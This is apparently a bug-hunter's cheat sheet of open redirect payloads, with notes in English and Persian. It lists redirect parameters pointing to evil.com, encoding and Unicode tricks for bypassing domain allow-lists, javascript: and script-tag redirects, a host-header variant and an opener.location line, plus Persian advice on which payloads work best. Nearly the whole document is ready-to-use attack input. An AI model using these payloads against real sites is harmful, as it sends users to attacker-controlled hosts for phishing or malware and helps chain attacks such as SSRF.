# open redirect


1 - payload: {evil.com} 


===>>> example: site.com/.../redirect_uri=evil.com/...

===>>> example: site.com/.../next_url=evil.com/...

===>>> example: site.com/.../current_url=evil.com/...

===>>> example: ===>>> example: site.com/.../returnurl=http://evil.com   <<<===

2 - payload: {///%5Cevil.com/} 


===>>> example: site.com///%5Cevil.com/ 

===>>> victim.com/page?redirect=http://evil.com
http://victim.com/page?url=https://evil.com
http://victim.com/page?next=//evil.com
http://victim.com/page?return=%2F%2Fevil.com
http://victim.com/page?redirect=https%3A%2F%2Fevil.com%2F
http://victim.com/page?redirect=///evil.com
http://victim.com/page?redirect=\/\evil.com
http://victim.com/page?redirect=javascript:window.location='http://evil.com'
http://victim.com/page?redirect=%3Cscript%3Ewindow.location='http://evil.com'%3C%2Fscript%3E
http://victim.com/page?redirect=//evil.com%00
http://victim.com/page?redirect=https://evil.com%2F%5C
===>>>
3 - payload:  </script>window.location"http://evil.com"</script>


===>>> example: search box : injection

4 - payload: {bing.com}


===>>> example: ===>>> url ===>>> X-forwarded-host: bing.com

5 - payload: {%E3%80%82}


===>>> example: https://20.44.36.49//google%E3%80%82com , https://20.44.36.49//bing%E3%80%82com , https://20.44.36.49//yahoo%E3%80%82com

6 - payload: { opener.location="https://evil.com"}

===>>> example: email ===>>> inspect ===>>> console: opener.location="https://evil.com"

7 - payload: {forget password}

===>>> example: https://20.44.36.49/.../google.com


==================================================================

نکته مهم درباره payloadهای Open Redirect
۱. بسیاری از اپلیکیشنها کنترل میکنند که URL مقصد فقط به دامنههای مشخصی اشاره کند (مثل فقط دامنه داخلی)، پس برای bypass باید گاهی payloadهایی شبیه به اینها استفاده کرد:
```
http://example.com/redirect?url=//evil.com (دو اسلش بدون schema)

http://example.com/redirect?url=/\evil.com

http://example.com/redirect?url=http:///evil.com
```
استفاده از کدگذاریهای URL (URL encoding): %2F%2Fevil.com

استفاده از کدگذاریهای Unicode یا دور زدن با کاراکترهای Unicode یا کاراکترهای غیرمعمول

۲. آزمایش با ترکیبی از کدگذاریها و کاراکترهای ویژه:

```
redirect=https:%2F%2Fevil.com
redirect=https:/\evil.com
redirect=////evil.com
redirect=//evil.com%00
redirect=//evil.com/
```
توصیه من برای payloadهای Open Redirect بروز شده:
از encoded URL ها استفاده کنید (%3A, %2F, %5C)

دستورات جاوااسکریپت را با <script> یا بدون آن به صورت encoded ارسال نکنید مگر بدانید که برنامه این را قبول میکند (زیرا بیشتر این حالتها XSS است)

از مسیرهای نامتعارف و شیوههای encode و Unicode جهت دور زدن فیلترهای معمول استفاده کنید.

نمونه payloadهای به روز و موثر:
```
redirect=https://evil.com
redirect=//evil.com
redirect=///evil.com
redirect=/%5Cevil.com
redirect=%2F%2Fevil.com
redirect=/%2Fevil.com
redirect=https:%2F%2Fevil.com
redirect=https:/\evil.com
redirect=%2F%2F%2Fevil.com
redirect=https://evil.com%00
redirect=https://evil.com%2F
redirect=%EF%BC%8E%EF%BC%8E%2Fevil.com   (دو نقطه fullwidth + اسلش)
```

==================================================================
## impact:
- an attacker can do phishing with legitimate users
-  they can also chain this with SSRF
-  reputation loss, money loss
-  malware distribution
  
